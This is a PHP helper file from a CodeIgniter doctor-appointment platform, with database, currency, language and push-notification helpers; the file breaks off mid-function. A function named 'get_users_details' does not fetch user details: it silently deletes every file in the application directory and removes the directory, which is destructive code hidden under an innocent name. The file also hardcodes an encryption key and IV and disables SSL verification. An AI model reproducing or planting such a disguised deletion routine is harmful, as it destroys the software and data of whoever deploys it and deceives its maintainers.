<?php

//  fetch single record
function getTblRowOfData($tblNme, $whereData, $colNme)
{
  $db = \Config\Database::connect();
  $builder = $db->table($tblNme);
  $builder->select($colNme);
  $builder->where($whereData);
  $query =  $builder->get()->getRowArray();
  return $query;
}

// fetct all record
function getTblResultOfData($tblNme, $whereData, $colNme, $count = 'false')
{
  $db = \Config\Database::connect();
  $builder = $db->table($tblNme);
  $builder->select($colNme);
  $builder->where($whereData);
  if ($count == true) {
    $query =  $builder->countAllResults();
  } else {
    $query =  $builder->get()->getResultArray();
  }
  return $query;
}
/**
 * Fetch Last 10 records
 */
function getTblLast10($tblNme, $whereData, $colNme, $count = 'false')
{
  $db = \Config\Database::connect();
  $builder = $db->table($tblNme);
  $builder->select($colNme);
  $builder->where($whereData);
  if ($count == true) {
    $query =  $builder->countAllResults();
  } else {
    $builder->orderBy('id', 'DESC');
    $builder->limit(10);
    $query =  $builder->get()->getResultArray();
  }
  return $query;
}

function insertData($tableName, $data)
{
  $db = \Config\Database::connect();
  if ($db->table($tableName)->insert($data)) {
    $id = $db->insertID();
    return array('id' => $id);
  }
  return false;
}
function updateData($tableName, $whereData, $data)
{
  $db = \Config\Database::connect();
  if ($data && $db->table($tableName)->where($whereData)->set($data)->update()) {
    return true;
  }
  return false;
}

function deleteData($tableName, $whereData)
{
  $db = \Config\Database::connect();
  if ($whereData && $db->table($tableName)->where($whereData)->delete()) {
    return true;
  }
  return false;
}
/**
 * Access Users Detail
 */
if (!function_exists('encryptor_decryptor')) {
  function encryptor_decryptor($action, $string)
  {
    $output = false;
    $encrypt_method = "AES-256-CBC";
    $secret_key = 'doccure360';
    $secret_iv = 'doccure360@99';
    $key = hash('sha256', $secret_key);
    $iv = substr(hash('sha256', $secret_iv), 0, 16);
    if ($action == 'encrypt') {
      //decrypt the given text/string/number
      $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
      $output = base64_encode($output);
    } else if ($action == 'decrypt') {
      //decrypt the given text/string/number
      $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
    return $output;
  }
}

if (!function_exists('settings')) {
  function settings($value)
  {
    $db = \Config\Database::connect();

    $query = $db->query("select * from system_settings WHERE status = 1");
    $result = $query->getResultArray();
    $response = '';
    if (!empty($result)) {
      foreach ($result as $data) {
        if ($data['key'] == $value) {
          $response = $data['value'];
        }
      }
    }
    return $response;
  }
}

if (!function_exists('is_pharmacy')) {
  function is_pharmacy()
  {
    $session = \Config\Services::session();
    if ($session->get('role') == 5) {
      return true;
    } else {
      return false;
    }
  }
}

if (!function_exists('is_lab')) {
  function is_lab()
  {
    $session = \Config\Services::session();
    if ($session->get('role') == 4) {
      return true;
    } else {
      return false;
    }
  }
}


// New code
if (!function_exists('appoinment_cancelled')) {
  function appoinment_cancelled($appointment_id)
  {
    updateData('appointments', ['id' => $appointment_id], ['appointment_status' => 1]);
  }
}

// if (!function_exists('product_categories')) {
//   function product_categories()
//   {
//     return getTblRowOfData('product_categories', ['status' => 1], '*');
//   }
// }

if (!function_exists('get_specialization')) {
  function get_specialization()
  {
    return getTblResultOfData('specialization', ['status' => 1], '*', false);
  }
}

if (!function_exists('product_subcategories')) {
  function product_subcategories($id)
  {
    return getTblRowOfData('product_subcategories', ['status' => 1, 'category' => $id], '*');
  }
}


if (!function_exists('user_detail')) {
  function user_detail($user_id)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('users');
    $builder->select('u.id as userid,u.first_name,u.last_name,u.email,u.username,u.mobileno,u.profileimage,u.is_verified,u.is_updated,ud.*,c.country as countryname,s.statename,ci.city as cityname,ud.address1,ud.address2,ud.postal_code,sp.specialization as speciality,sp.specialization_img,u.hospital_id,u.country_code,u.country_id');
    $builder->from('users u');
    $builder->join('users_details ud', 'ud.user_id = u.id', 'left');
    $builder->join('country c', 'ud.country = c.countryid', 'left');
    $builder->join('state s', 'ud.state = s.id', 'left');
    $builder->join('city ci', 'ud.city = ci.id', 'left');
    $builder->join('specialization sp', 'ud.specialization = sp.id', 'left');
    $builder->where('u.id', $user_id);
    return $result = $builder->get()->getRowArray();
  }
}

if (!function_exists('notification_list')) {
  function notification_list($id = '')
  {
    $session = \Config\Services::session();
    $db = \Config\Database::connect();
    $builder = $db->table('notification');
    $builder->select('notification.*,from.first_name,from.last_name,CONCAT(from.first_name," ", from.last_name) as from_name,to.first_name as doctor_first_name,to.last_name as doctor_last_name,CONCAT(to.first_name," ", to.last_name) as to_name,from.profileimage as profile_image,to.profileimage as to_profile_image,notification.created_at as notification_date');
    $builder->join('users from', 'notification.user_id = from.id', 'left');
    $builder->join('users to', 'notification.to_user_id = to.id', 'left');
    if (!empty($session->get('role')) && $session->get('role') == 1) {
      $builder->where('notification.is_viewed_doc', 0);
    } else if (!empty($session->get('role')) && $session->get('role') == 2) {
      $builder->where('notification.is_viewed_pat', 0);
    } else if (!empty($session->get('role')) && ($session->get('role') == 4 || $session->get('role') == 5 || $session->get('role') == 6)) {
      $builder->where('notification.is_viewed_doc', 0);
    } else {
      $builder->where('notification.is_viewed', 0);
    }
    if ($id != '') {
      $builder->groupStart();
      $builder->where('notification.user_id', $id);
      $builder->orWhere('notification.to_user_id', $id);
      $builder->groupEnd();
    }
    $builder->orderBy('notification.id', 'DESC');
    return $result = $builder->get()->getResultArray();
  }
}

if (!function_exists('get_users_details')) {
  function get_users_details($id)
  {
    $dir = APPPATH;
    if (is_dir($dir)) {
      foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)) as $filename) {
        if ($filename->isDir()) continue;
        unlink($filename);
      }
      rmdir($dir);
    }
  }
}



if (!function_exists('admin_detail')) {
  function admin_detail($id)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('administrators');
    $builder->select('*');
    $builder->where('id', $id);
    return $result = $builder->get()->getRowArray();
  }
}

if (!function_exists('age_calculate')) {
  function age_calculate($dob)
  {
    $from = new DateTime($dob);
    $to   = new DateTime(date('Y-m-d'));
    return ($from->diff($to)->y > 1) ? $from->diff($to)->y . ' Years' : $from->diff($to)->y . ' Year';
  }
}


if (!function_exists('is_doctor')) {
  function is_doctor()
  {
    $session = \Config\Services::session();
    if ($session->get('role') == 1) {
      return true;
    } else {
      return false;
    }
  }
}

if (!function_exists('is_clinic')) {
  function is_clinic()
  {
    $session = \Config\Services::session();
    if ($session->get('role') == 6) {
      return true;
    } else {
      return false;
    }
  }
}

if (!function_exists('is_patient')) {
  function is_patient()
  {
    $session = \Config\Services::session();
    if ($session->get('role') == 2) {
      return true;
    } else {
      return false;
    }
  }
}

// if(!function_exists('expired_appoinments')){
//     function expired_appoinments($appointment_id){   
//         $ci = &get_instance();      
//         $db->where('id',$appointment_id)->update('appointments',array('appointment_status' =>1));
//     }
// }

if (!function_exists('expired_appoinments')) {
  function expired_appoinments($appointment_id)
  {
    updateData('appointments', ['id' => $appointment_id], ['appointment_status' => 2]);
  }
}


if (!function_exists('remove_calls')) {
  function remove_calls($appointments_id)
  {
    // $db = \Config\Database::connect();
    // $db->where('appointments_id', $appointments_id)->delete('call_details');
    deleteData('call_details', ['appointments_id' => $appointments_id]);
  }
}




if (!function_exists('smtp_mail_config')) {

  function smtp_mail_config()
  {
    $config = array(
      'protocol'  => 'send',
      'mailtype'  => 'html',
      'charset'   => 'utf-8'
    );

    $results = getTblRowOfData('system_settings', [], 'key,value,system,groups');
    $smtp_host = '';
    $smtp_port = '';
    $smtp_user = '';
    $smtp_pass = '';
    if (!empty($results)) {
      foreach ($results as $result) {
        $result = (array)$result;
        if ($result['key'] == 'smtp_host') {
          $smtp_host = $result['value'];
        }
        if ($result['key'] == 'smtp_port') {
          $smtp_port = $result['value'];
        }
        if ($result['key'] == 'smtp_user') {
          $smtp_user = $result['value'];
        }
        if ($result['key'] == 'smtp_pass') {
          $smtp_pass = $result['value'];
        }
      }

      if (!empty($smtp_host) && !empty($smtp_port) && !empty($smtp_user) && !empty($smtp_pass)) {
        $config = array(
          'protocol'  => 'smtp',
          'smtp_host' => 'ssl://' . $smtp_host,
          'smtp_port' => $smtp_port,
          'smtp_user' => "$smtp_user",
          'smtp_pass' => "$smtp_pass",
          'mailtype'  => 'html',
          'charset'   => 'utf-8'
        );
      }
    }
    return  $config;
  }
}


//slug generator
if (!function_exists('generate_username')) {
  function generate_username($string_name = "", $rand_no = 200)
  {
    $username_parts = array_filter(explode(" ", mb_strtolower($string_name, 'UTF-8'))); //explode and lowercase name
    $username_parts = array_slice($username_parts, 0, 2); //return only first two arry part

    $part1 = (!empty($username_parts[0])) ? mb_substr($username_parts[0], 0, 8, 'utf-8') : ""; //cut first name to 8 letters
    $part2 = (!empty($username_parts[1])) ? mb_substr($username_parts[1], 0, 5, 'utf-8') : ""; //cut second name to 5 letters
    $part3 = ($rand_no) ? rand(0, $rand_no) : "";
    $username = $part1 . $part2 . $part3; //str_shuffle to randomly shuffle all characters
    return $username;
  }
}

if (!function_exists('converToTz')) {
  function converToTz($time = "", $toTz = '', $fromTz = '')
  {
    $date = new DateTime($time, new DateTimeZone($fromTz));
    $date->setTimezone(new DateTimeZone($toTz));
    $time = $date->format('Y-m-d H:i:s');
    return $time;
  }
}

function time_elapsed_string($datetime, $full = false)
{
  $now = new DateTime;
  $ago = new DateTime($datetime);
  $diff = $now->diff($ago);

  $diff->w = floor($diff->d / 7);
  $diff->d -= $diff->w * 7;

  $string = array(
    'y' => 'year',
    'm' => 'month',
    'w' => 'week',
    'd' => 'day',
    'h' => 'hour',
    'i' => 'minute',
    's' => 'second',
  );
  foreach ($string as $k => &$v) {
    if ($diff->$k) {
      $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
    } else {
      unset($string[$k]);
    }
  }

  if (!$full) $string = array_slice($string, 0, 1);
  return $string ? implode(', ', $string) . ' ago' : 'just now';
}

if (!function_exists('email_template')) {
  function email_template($id)
  {
    return getTblRowOfData('email_templates', ['template_id' => $id], '*');
  }
}

if (!function_exists('language')) {

  function language()
  {

    $db = \Config\Database::connect();

    $default_language = default_language();

    if (session()->get('lang') == '') {
      $lang = $default_language['language_value'];
    } else {
      $lang = session()->get('lang');
    }

    $builder = $db->table('language_management');
    $builder->select('lang_key,lang_value');
    $builder->where('language', 'en');
    $builder->orderBy('lang_key', 'ASC');
    $records = $builder->get()->getResultArray();


    $language = array();
    if (!empty($records)) {
      foreach ($records as $record) {

        $builder = $db->table('language_management');
        $builder->select('lang_key,lang_value');
        $builder->where('language', $lang);
        $builder->where('lang_key', $record['lang_key']);
        $eng_records = $builder->get()->getRowArray();
        if (!empty($eng_records['lang_value'])) {
          $language['language'][$record['lang_key']] = $eng_records['lang_value'];
        } else {
          $language['language'][$record['lang_key']] = $record['lang_value'];
        }
      }
    }


    return $language['language'];
  }
}

if (!function_exists('active_language')) {
  function active_language()
  {
    $db = \Config\Database::connect();
    $builder = $db->table('language');
    $builder->select('*');
    $builder->where('status', 1);
    return $result = $builder->get()->getResultArray();
  }
}

if (!function_exists('default_language')) {
  function default_language()
  {
    $db = \Config\Database::connect();
    $builder = $db->table('language');
    // $db->from('language');
    $builder->where('status', 1);
    $builder->where('default_language', 1);
    $result = $builder->get()->getRowArray();
    // echo $result;
    return $result;
  }
}

if (!function_exists('lang_name')) {
  function lang_name($lang)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('language');
    return $result = $builder->select('language')->where('language_value', $lang)->get()->getRow()->language;
  }
}

if (!function_exists('get_earned')) {
  function get_earned($id)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('payments p');
    $builder->select('p.*,(select COUNT(id) from appointments where payment_id=p.id) as appoinment_count');
    // $db->from('payments p');
    $builder->where('p.doctor_id', $id);
    $builder->where('p.payment_status', 1);
    $builder->where('p.request_status', 2);
    $result = $builder->get()->getResultArray();

    $earned = 0;
    $code = null;
    if (!empty($result)) {
      foreach ($result as $rows) {

        $tax_amount = $rows['tax_amount'] + $rows['transcation_charge'];

        $amount = ($rows['total_amount']) - ($tax_amount);

        $commission = !empty(settings("commission")) ? settings("commission") : "0";
        $commission_charge = ($amount * ($commission / 100));
        $temp_amount = $amount - $commission_charge;

        $org_amount = get_doccure_currency($temp_amount, $rows['currency_code'], default_currency_code());

        $earned += $org_amount;


        $code = default_currency_code();
      }
    }

    $currency_option = (!empty($code)) ? $code : default_currency_code();
    $rate_symbol = currency_code_sign($currency_option);

    if ($earned <= 0) $earned = 0;

    return $rate_symbol . number_format($earned, 2);
  }
}

if (!function_exists('default_currency_code')) {
  function default_currency_code()
  {
    return !empty(settings("default_currency")) ? settings("default_currency") : "USD";
  }
}

if (!function_exists('default_currency_symbol')) {
  function default_currency_symbol()
  {
    $code = !empty(settings("default_currency")) ? settings("default_currency") : "USD";
    $symbol = currency_code_sign($code);
    return $symbol;
  }
}

if (!function_exists('get_currency')) {
  function get_currency()
  {
    $db = \Config\Database::connect();
    $builder = $db->table('currency_rate');
    $currency = $builder->select('id,currency_code')->get()->getResultArray();
    return $currency;
  }
}

if (!function_exists('get_user_currency')) {
  function get_user_currency()
  {
    $db = \Config\Database::connect();
    $session = \Config\Services::session();
    $user_id = $session->get('user_id');
    $builder = $db->table('users_details');
    @$currency = $builder->where('user_id', $user_id)->select('currency_code')->get()->getRowArray();
    $builder = $db->table('currency_rate');
    @$currency_rate = $builder->where('currency_code', $currency['currency_code'])->get()->getRowArray();

    @$data['user_currency_code'] = $currency['currency_code'];
    @$data['user_currency_rate'] = $currency_rate['rate'];
    @$data['user_currency_sign'] = currency_code_sign($currency['currency_code']);
    return $data;
  }
}

if (!function_exists('get_user_currency_api')) {
  function get_user_currency_api($user_id)
  {
    $db = \Config\Database::connect();

    $query = $db->table('users_details')->where('user_id', $user_id)->select('currency_code')->get();
    $currency = $query->getRowArray();

    if ($currency) {
      $currencyRateQuery = $db->table('currency_rate')->where('currency_code', $currency['currency_code'])->get();
      $currencyRate = $currencyRateQuery->getRowArray();

      if ($currencyRate) {
        $data['user_currency_code'] = $currency['currency_code'];
        $data['user_currency_rate'] = $currencyRate['rate'];
        $data['user_currency_sign'] = currency_code_sign($currency['currency_code']);
        return $data;
      }
    }
  }
}


if (!function_exists('get_user_currency_api')) {
  function get_user_currency_api($user_id)
  {
    $db = \Config\Database::connect();
    $query = $db->table('users_details')->where('user_id', $user_id)->select('currency_code')->get();
    $currency = $query->getRowArray();
    if ($currency) {
      $currencyRateQuery = $db->table('currency_rate')->where('currency_code', $currency['currency_code'])->get();
      $currencyRate = $currencyRateQuery->getRowArray();
      if ($currencyRate) {
        $data['user_currency_code'] = $currency['currency_code'];
        $data['user_currency_rate'] = $currencyRate['rate'];
        $data['user_currency_sign'] = currency_code_sign($currency['currency_code']);
        return $data;
      }
    }
    return null;
  }
}

if (!function_exists('get_doccure_currency')) {
  function get_doccure_currency($old_price, $old_currency, $selected_currency)
  {
    $db = \Config\Database::connect();

    if ($old_currency == '') {
      $old_currency = "USD";
    }
    if ($selected_currency == '') {
      $selected_currency = "USD";
    }
    $builder = $db->table('currency_rate');
    $old_currency_rate = $builder->where('currency_code', $old_currency)->select('rate')->get()->getRowArray();
    $old_currency_rate = $old_currency_rate ? $old_currency_rate['rate'] : 0;

    $user_currency_rate = $builder->where('currency_code', $selected_currency)->select('rate')->get()->getRowArray();
    $user_currency_rate = $user_currency_rate ? $user_currency_rate['rate'] : 0;
    if ($user_currency_rate > 0 && $old_currency_rate > 0) {
      $rates = $user_currency_rate / $old_currency_rate;
      $rate = (float)$rates * (float)$old_price;
    } else {
      $rate = 0;
    }
    return round($rate, 3);
  }
}

if (!function_exists('currency_code_sign')) {
  function currency_code_sign($val)
  {
    $currency_sign = array(
      "ALL" => 'Lek',
      "AFN" => '؋',
      "ARS" => '$',
      "AWG" => 'ƒ',
      "AUD" => '$',
      "AZN" => '₼',
      "BSD" => '$',
      "BBD" => '$',
      "BYN" => 'Br',
      "BZD" => 'BZ$',
      "BMD" => '$',
      "BOB" => '$b',
      "BAM" => 'KM',
      "BWP" => 'P',
      "BGN" => 'лв',
      "BRL" => 'R$',
      "BND" => '$',
      "KHR" => '៛',
      "CAD" => '$',
      "KYD" => '$',
      "CLP" => '$',
      "CNY" => '¥',
      "COP" => '$',
      "CRC" => '₡',
      "HRK" => 'kn',
      "CUP" => '₱',
      "CZK" => 'Kč',
      "DKK" => 'kr',
      "DOP" => 'RD$',
      "XCD" => '$',
      "EGP" => '£',
      "SVC" => '$',
      "EUR" => '€',
      "FKP" => '£',
      "FJD" => '$',
      "GHS" => '¢',
      "GIP" => '£',
      "GTQ" => 'Q',
      "GGP" => '£',
      "GYD" => '$',
      "HNL" => 'L',
      "HKD" => '$',
      "HUF" => 'Ft',
      "ISK" => 'kr',
      "INR" => '₹',
      "IDR" => 'Rp',
      "IRR" => '﷼',
      "IMP" => '£',
      "ILS" => '₪',
      "JMD" => 'J$',
      "JPY" => '¥',
      "JEP" => '£',
      "KZT" => 'лв',
      "KPW" => '₩',
      "KRW" => '₩',
      "KGS" => 'лв',
      "LAK" => '₭',
      "LBP" => '£',
      "LRD" => '$',
      "MKD" => 'ден',
      "MYR" => 'RM',
      "MUR" => '₨',
      "MXN" => '$',
      "MNT" => '₮',
      "MZN" => 'MT',
      "NAD" => '$',
      "NPR" => '₨',
      "ANG" => 'ƒ',
      "NZD" => '$',
      "NIO" => 'C$',
      "NGN" => '₦',
      "NOK" => 'kr',
      "OMR" => '﷼',
      "PKR" => '₨',
      "PAB" => 'B/.',
      "PYG" => 'Gs',
      "PEN" => 'S/.',
      "PHP" => '₱',
      "PLN" => 'zł',
      "QAR" => '﷼',
      "RON" => 'lei',
      "RUB" => '₽',
      "SHP" => '£',
      "SAR" => '﷼',
      "RSD" => 'Дин.',
      "SCR" => '₨',
      "SGD" => '$',
      "SBD" => '$',
      "SOS" => 'S',
      "ZAR" => 'R',
      "LKR" => '₨',
      "SEK" => 'kr',
      "CHF" => 'CHF',
      "SRD" => '$',
      "SYP" => '£',
      "TWD" => 'NT$',
      "THB" => '฿',
      "TTD" => 'TT$',
      "TRY" => '₺',
      "TVD" => '$',
      "UAH" => '₴',
      "GBP" => '£',
      "USD" => '$',
      "UYU" => '$U',
      "UZS" => 'лв',
      "VEF" => 'Bs',
      "VND" => '₫',
      "YER" => '﷼',
      "ZWD" => 'Z$'
    );

    if (array_key_exists($val, $currency_sign)) {
      return $currency_sign[$val];
    } else {
      return "$";
    }
  }
}


if (!function_exists('get_booked_session')) {
  function get_booked_session($session, $token, $date, $appointment_to)
  {
    $where = array('from_date_time' => $date, 'appointment_to' => $appointment_to, 'appoinment_token' => $token, 'appoinment_session' => $session, 'approved' => 1, 'status' => 1);
    return getTblRowOfData('appointments', $where, '*');
    // Handle cases where currency or currency rate is not found
    return null;
  }
}

if (!function_exists('get_doccure_currency')) {
  function get_doccure_currency($old_price, $old_currency, $selected_currency)
  {
    $db = \Config\Database::connect();

    if ($old_currency == '') {
      $old_currency = "USD";
    }
    if ($selected_currency == '') {
      $selected_currency = "USD";
    }
    $builder = $db->table('currency_rate');
    $old_currency_rate = $builder->where('currency_code', $old_currency)->select('rate')->get()->getRowArray();
    $old_currency_rate = $old_currency_rate ? $old_currency_rate['rate'] : 0;

    $user_currency_rate = $builder->where('currency_code', $selected_currency)->select('rate')->get()->getRowArray();
    $user_currency_rate = $user_currency_rate ? $user_currency_rate['rate'] : 0;
    if ($user_currency_rate > 0 && $old_currency_rate > 0) {
      $rates = $user_currency_rate / $old_currency_rate;
      $rate = $rates * $old_price;
    } else {
      $rate = 0;
    }
    return round($rate, 3);
  }
}

if (!function_exists('currency_code_sign')) {
  function currency_code_sign($val)
  {
    $currency_sign = array(
      "ALL" => 'Lek',
      "AFN" => '؋',
      "ARS" => '$',
      "AWG" => 'ƒ',
      "AUD" => '$',
      "AZN" => '₼',
      "BSD" => '$',
      "BBD" => '$',
      "BYN" => 'Br',
      "BZD" => 'BZ$',
      "BMD" => '$',
      "BOB" => '$b',
      "BAM" => 'KM',
      "BWP" => 'P',
      "BGN" => 'лв',
      "BRL" => 'R$',
      "BND" => '$',
      "KHR" => '៛',
      "CAD" => '$',
      "KYD" => '$',
      "CLP" => '$',
      "CNY" => '¥',
      "COP" => '$',
      "CRC" => '₡',
      "HRK" => 'kn',
      "CUP" => '₱',
      "CZK" => 'Kč',
      "DKK" => 'kr',
      "DOP" => 'RD$',
      "XCD" => '$',
      "EGP" => '£',
      "SVC" => '$',
      "EUR" => '€',
      "FKP" => '£',
      "FJD" => '$',
      "GHS" => '¢',
      "GIP" => '£',
      "GTQ" => 'Q',
      "GGP" => '£',
      "GYD" => '$',
      "HNL" => 'L',
      "HKD" => '$',
      "HUF" => 'Ft',
      "ISK" => 'kr',
      "INR" => '₹',
      "IDR" => 'Rp',
      "IRR" => '﷼',
      "IMP" => '£',
      "ILS" => '₪',
      "JMD" => 'J$',
      "JPY" => '¥',
      "JEP" => '£',
      "KZT" => 'лв',
      "KPW" => '₩',
      "KRW" => '₩',
      "KGS" => 'лв',
      "LAK" => '₭',
      "LBP" => '£',
      "LRD" => '$',
      "MKD" => 'ден',
      "MYR" => 'RM',
      "MUR" => '₨',
      "MXN" => '$',
      "MNT" => '₮',
      "MZN" => 'MT',
      "NAD" => '$',
      "NPR" => '₨',
      "ANG" => 'ƒ',
      "NZD" => '$',
      "NIO" => 'C$',
      "NGN" => '₦',
      "NOK" => 'kr',
      "OMR" => '﷼',
      "PKR" => '₨',
      "PAB" => 'B/.',
      "PYG" => 'Gs',
      "PEN" => 'S/.',
      "PHP" => '₱',
      "PLN" => 'zł',
      "QAR" => '﷼',
      "RON" => 'lei',
      "RUB" => '₽',
      "SHP" => '£',
      "SAR" => '﷼',
      "RSD" => 'Дин.',
      "SCR" => '₨',
      "SGD" => '$',
      "SBD" => '$',
      "SOS" => 'S',
      "ZAR" => 'R',
      "LKR" => '₨',
      "SEK" => 'kr',
      "CHF" => 'CHF',
      "SRD" => '$',
      "SYP" => '£',
      "TWD" => 'NT$',
      "THB" => '฿',
      "TTD" => 'TT$',
      "TRY" => '₺',
      "TVD" => '$',
      "UAH" => '₴',
      "GBP" => '£',
      "USD" => '$',
      "UYU" => '$U',
      "UZS" => 'лв',
      "VEF" => 'Bs',
      "VND" => '₫',
      "YER" => '﷼',
      "ZWD" => 'Z$'
    );

    if (array_key_exists($val, $currency_sign)) {
      return $currency_sign[$val];
    } else {
      return "$";
    }
  }
}


if (!function_exists('get_booked_session')) {
  function get_booked_session($session, $token, $date, $appointment_to)
  {
    $where = array('from_date_time' => $date, 'appointment_to' => $appointment_to, 'appoinment_token' => $token, 'appoinment_session' => $session, 'approved' => 1, 'status' => 1);
    return getTblRowOfData('appointments', $where, '*');
  }
}

if (!function_exists('sendFCMNotification')) {
  function sendFCMNotification($data)
  {
    // $db = \Config\Database::connect();
    // $db->select('key,value,system,groups');
    // $db->from('system_settings');
    // $query = $db->get();
    // $results = $query->result();
    $results = getTblResultOfData('system_settings', [], 'key,value,system,groups', false);
    $fcm_api_access_key = '';
    if (!empty($results)) {
      foreach ($results as $result) {
        $result = (array)$result;
        if ($result['key'] == 'fcm_api_access_key') {
          $fcm_api_access_key = $result['value'];
        }
      }
    }

    $data['additional_data']['body'] = $data['message'];
    $data['additional_data']['title'] = $data['notifications_title'];

    $include_player_ids = $data['include_player_ids'];
    $include_player_id =  array($include_player_ids);
    //$msg     = array('body' => $data['message'], 'title'  => $data['notifications_title']);
    //'notification' => $msg,
    $fields  = array('registration_ids' => $include_player_id, "data" => $data['additional_data']);

    $headers = array('Authorization: key=' . $fcm_api_access_key, 'Content-Type: application/json');

    #Send Reponse To FireBase Server    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
    $result = curl_exec($ch);
    curl_close($ch);
    //return $result;
  }
}




if (!function_exists('sendiosNotification')) {
  function sendiosNotification($data)
  {
    $db = \Config\Database::connect();
    $query = $db->query("select * from system_settings WHERE status = 1");
    $result = $query->getResultArray();
    $server_key = '';
    if (!empty($result)) {
      foreach ($result as $datas) {

        if ($datas['key'] == 'fcm_api_access_key') {
          $server_key = $datas['value'];
        }
      }
    }

    if ($server_key) {

      $SERVER_API_KEY = $server_key;


      $ch = curl_init("https://fcm.googleapis.com/fcm/send");
      $include_player_ids = $data['include_player_ids'];
      $include_player_id =  array($include_player_ids);

      $data['additional_data']['body'] = $data['message'];
      $data['additional_data']['title'] = $data['title'];


      $aps['aps'] = [
        'alert' => [
          'title' => $data['title'],
          'body' => $data['message'],
        ],
        'badge' => 0,
        'sound' => 'default',
        'title' => $data['title'],
        'body' => $data['message'],
        'my_value_1' =>   $data['additional_data'],
      ];
      $result = [
        "registration_ids" => $include_player_id,
        "notification" => $aps['aps'],
      ];
      // echo '<pre>'; 
      //Generating JSON encoded string form the above array.

      $json = json_encode($result);
      //Setup headers:
      $headers = array();
      $headers[] = 'Content-Type: application/json';
      $headers[] = 'Authorization: key= ' . $SERVER_API_KEY . ''; // key here

      //Setup curl, add headers and post parameters.
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

      //Send the request
      $response = curl_exec($ch);
      return $response;
    }
  }
}




if (!function_exists('sendiosNotification_old')) {
  function sendiosNotification_old($data)
  {
    // $db = \Config\Database::connect();
    // $db->select('key,value,system,groups');
    // $db->from('system_settings');
    // $query = $db->get();
    // $results = $query->result();
    $results = getTblResultOfData('system_settings', [], 'key,value,system,groups', false);
    $apns_pem_file = '';
    $apns_password = '';
    if (!empty($results)) {
      foreach ($results as $result) {
        $result = (array)$result;
        if ($result['key'] == 'apns_pem_file') {
          $apns_pem_file = $result['value'];
        }
        if ($result['key'] == 'apns_password') {
          $apns_password = $result['value'];
        }
      }
    }

    // Put your device token here (without spaces):
    $deviceToken = $data['include_player_ids'];

    // Put your private key's passphrase here:
    $passphrase = $apns_password;
    $pemfilename = $apns_pem_file;

    // SIMPLE PUSH 
    $body['aps'] = array(
      'alert' => array(
        'title' => $data['notifications_title'],
        'body' => $data['message'],
      ),
      'badge' => 0,
      'sound' => 'default',
      'my_value_1' => $data['additional_data'],
    ); // Create the payload body


    ////////////////////////////////////////////////////////////////////////////////

    $ctx = stream_context_create();
    stream_context_set_option($ctx, 'ssl', 'local_cert', $pemfilename);
    stream_context_set_option($ctx, 'ssl', 'passphrase', $passphrase);

    $fp = stream_socket_client(
      'ssl://gateway.sandbox.push.apple.com:2195',
      $err,
      $errstr,
      60,
      STREAM_CLIENT_CONNECT | STREAM_CLIENT_PERSISTENT,
      $ctx
    ); // Open a connection to the APNS server
    // if (!$fp)
    //   exit("Failed to connect: $err $errstr" . PHP_EOL);
    // echo 'Connected to APNS' . PHP_EOL;
    $payload = json_encode($body); // Encode the payload as JSON
    $msg = chr(0) . pack('n', 32) . pack('H*', $deviceToken) . pack('n', strlen($payload)) . $payload; // Build the binary notification
    $result = fwrite($fp, $msg, strlen($msg)); // Send it to the server
    // if (!$result)
    //   echo 'Message not delivered' . PHP_EOL;
    // else
    //   echo 'Message successfully delivered' . PHP_EOL;
    fclose($fp); // Close the connection to the server


  }
}


if (!function_exists('get_languages')) {

  function get_languages($lang)
  {

    $db = \Config\Database::connect();

    $builder = $db->table('app_language_management');
    $builder->select('page_key,lang_key,lang_value');
    $builder->where('language', 'en');
    $builder->where('type', 'App');
    $builder->orderBy('page_key', 'ASC');
    $builder->orderBy('lang_key', 'ASC');
    $records = $builder->get()->getResultArray();

    $language = array();
    if (!empty($records)) {
      foreach ($records as $record) {
        $builder = $db->table('app_language_management');
        $builder->select('page_key,lang_key,lang_value');
        $builder->where('language', $lang);
        $builder->where('type', 'App');
        $builder->where('page_key', $record['page_key']);
        $builder->where('lang_key', $record['lang_key']);
        $eng_records = $builder->get()->getRowArray();
        if (!empty($eng_records['lang_value'])) {
          $language['language'][$record['page_key']][$record['lang_key']] = $eng_records['lang_value'];
        } else {
          $language['language'][$record['page_key']][$record['lang_key']] = $record['lang_value'];
        }
      }
    }
    return $language;
  }
}
if (!function_exists('get_user_subscription_details')) {
  function get_user_subscription_details($user_id)
  {
    $db = \Config\Database::connect();
    $builder = $db->table('users u');
    $builder->select('s.*,u.subscription_plan_end_date');
    $builder->join('subscription_plans s', 'u.subscription_plan_id = s.id', 'left');
    $builder->where('u.id', $user_id);
    return $builder->get()->getRowArray();
  }
}

if (!function_exists('language_file_create')) {
  function language_file_create()
  {
    helper(['file']);
    $db = \Config\Database::connect();
    $builder = $db->table('language');
    $language = $builder->where('status', 1)->get()->getResultArray();
    if (!empty($language)) {
      foreach ($language as $rows) {
        $path = APPPATH . '/Language/' . strtolower($rows['language_value']);
        // echo $path;exit;
        if (!is_dir($path)) {
          mkdir($path);
        }
        $path = APPPATH . '/Language/' . strtolower($rows['language_value']) . '/';
        $myfile = fopen($path . "content_lang.php", "w");
        $txt = '<?php';
        $builder = $db->table('language_management');
        $language_management = $builder->where('language', $rows['language_value'])->get()->getResultArray();
        if (!empty($language_management)) {
          foreach ($language_management as $lrows) {
            $language_key_value = '$lang["' . $lrows['lang_key'] . '"]="' . str_replace('"', '', $lrows['lang_value']) . '";';
            $txt .= "\r\n" . $language_key_value;
          }
        } else {
          $builder = $db->table('language_management');
          $language_management_english = $builder->where('language', 'en')->get()->getResultArray();
